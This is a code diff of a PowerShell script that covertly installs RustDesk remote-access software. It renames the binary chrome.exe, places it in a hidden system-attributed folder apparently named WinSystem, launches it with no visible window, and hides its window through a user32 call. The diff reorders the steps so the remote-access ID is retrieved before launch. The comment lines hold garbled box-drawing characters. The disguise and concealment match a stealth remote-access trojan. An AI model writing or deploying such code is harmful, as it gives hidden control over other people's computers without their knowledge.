@@ -62,26 +62,39 @@ approve-mode = 'password'
 $f = Get-Item $DEST -Force
 $f.Attributes = $f.Attributes -bor 2 -bor 4   # Hidden + System
 
-# â”€â”€ 6. Launch RustDesk hidden as detached process â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-Set-Location $DEST
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = "$DEST\chrome.exe"
-$psi.WorkingDirectory = $DEST
-$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-$psi.UseShellExecute = $true
-[System.Diagnostics.Process]::Start($psi) | Out-Null
-Start-Sleep 5
+# â”€â”€ 6. Get ID FIRST (before launching) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+$idRaw = & "$DEST\chrome.exe" --get-id 2>&1
+$RDID = if($idRaw){"$idRaw".Trim()}else{""}
 
-# â”€â”€ 7. Hide window â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# If --get-id failed, launch once briefly to generate ID then get it
+if(!$RDID -or $RDID -notmatch '^\d+$'){
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "$DEST\chrome.exe"
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.UseShellExecute = $true
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    Start-Sleep 4
+    Get-Process chrome -EA SilentlyContinue | Where-Object{$_.Path -like "*WinSystem*"} | Stop-Process -Force -EA SilentlyContinue
+    Start-Sleep 2
+    $idRaw = & "$DEST\chrome.exe" --get-id 2>&1
+    $RDID = if($idRaw){"$idRaw".Trim()}else{""}
+}
+
+# â”€â”€ 7. Launch RustDesk hidden as detached process â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+Set-Location $DEST
+$psi2 = New-Object System.Diagnostics.ProcessStartInfo
+$psi2.FileName = "$DEST\chrome.exe"
+$psi2.WorkingDirectory = $DEST
+$psi2.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$psi2.UseShellExecute = $true
+[System.Diagnostics.Process]::Start($psi2) | Out-Null
+Start-Sleep 4
+
+# â”€â”€ 8. Hide window â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
 Get-Process chrome -EA SilentlyContinue |
     Where-Object { $_.Path -like "*WinSystem*" } |
     ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }
-
-# â”€â”€ 8. Get ID â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-Start-Sleep 2
-& "$DEST\chrome.exe" --get-id | Out-File "$DEST\id.txt" -Encoding ASCII
-$RDID = (Get-Content "$DEST\id.txt" -Raw).Trim()
 
 # â”€â”€ 9. Create desktop DELETE shortcut â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 $deletePs = "$DEST\delete.ps1"
